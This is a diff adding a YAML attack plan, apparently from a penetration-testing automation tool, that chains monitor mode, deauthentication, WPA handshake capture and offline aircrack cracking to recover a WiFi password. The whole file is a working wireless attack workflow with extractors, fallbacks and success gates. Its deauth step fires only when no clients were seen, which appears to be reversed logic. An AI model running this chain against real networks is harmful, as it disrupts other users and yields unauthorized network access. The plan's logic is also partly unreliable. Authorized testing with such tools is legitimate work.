@@ -1,0 +1,88 @@
+# Mech-Unit attack intent — WPA/WPA2 handshake capture + offline crack.
+# Packages the classic airodump → aireplay → aircrack chain (mirrors
+# workflows/templates/wireless_wpa_chain.yaml semantics) as a compiled plan.
+id: wifi_wpa_handshake
+name: WPA/WPA2 Handshake Capture + Crack
+category: wireless
+operator_label: "Crack a WiFi password (handshake)"
+operator_description: >
+  Forces clients of the target AP to reconnect, captures the WPA 4-way
+  handshake, then cracks it offline against a wordlist. The classic path:
+  most reliable when the AP has active clients. Noisy (visible deauth).
+outcome: "PSK (WiFi password) in plaintext, or wordlist exhaustion"
+grants: [wifi.psk]
+time_to_impact: minutes-to-hours
+noise: high
+risk_notes: >
+  Deauthentication is disruptive to other users of the target network.
+  Only use on networks you own or are authorized to test.
+
+preconditions:
+  - probe: wireless_adapter_monitor_capable
+  - probe: tools_present
+    with: [airodump-ng, aireplay-ng, aircrack-ng]
+  - probe: wordlist_available
+    with: ["/usr/share/wordlists/rockyou.txt"]
+    optional: true          # resolver falls back to bundled wordlists
+
+plan:
+  - step: monitor_up
+    tool: monitor_mode_enable
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+
+  - step: discover
+    tool: airodump_capture
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      channel: "{{ resolver.channel.or_hop }}"
+      capture_file: "{{ resolver.artifacts.capture_prefix }}"
+    max_wait: 120
+    extracts:
+      bssid: "([0-9A-Fa-f:]{17})"
+      essid: "[\\t ](?!\\*)[^\\t ]{1,32}$"
+      clients_seen: "([1-9][0-9]*) (?:stations|clients)"
+    on_fail: abort
+
+  - step: deauth
+    tool: aireplay_attack
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      attack: "0"
+    when: "!{{ facts.clients_seen }}"   # run when no clients were seen yet
+    max_wait: 30
+    on_fail: warn
+    fallbacks:
+      - step: pmkid_route
+        use_intent: wifi_pmkid
+
+  - step: capture
+    tool: airodump_capture
+    args:
+      interface: "{{ resolver.interface.monitor }}"
+      bssid: "{{ target.bssid }}"
+      channel: "{{ resolver.channel.or_hop }}"
+      capture_file: "{{ resolver.artifacts.capture_prefix }}"
+    max_wait: 300
+    gate:
+      output: "WPA handshake|handshake"
+    on_fail: retry_then_fallback
+    fallbacks:
+      - step: pmkid_route2
+        use_intent: wifi_pmkid
+
+  - step: crack
+    tool: aircrack_crack
+    args:
+      cap_file: "{{ artifacts.capture }}"
+      wordlist: "{{ resolver.wordlist.adaptive }}"
+    max_wait: 3600
+    gate:
+      output: "KEY FOUND"
+    on_fail: warn
+
+artifacts:
+  capture: "{{ plan_dir }}/capture-01.cap"
+
+llm_required: false
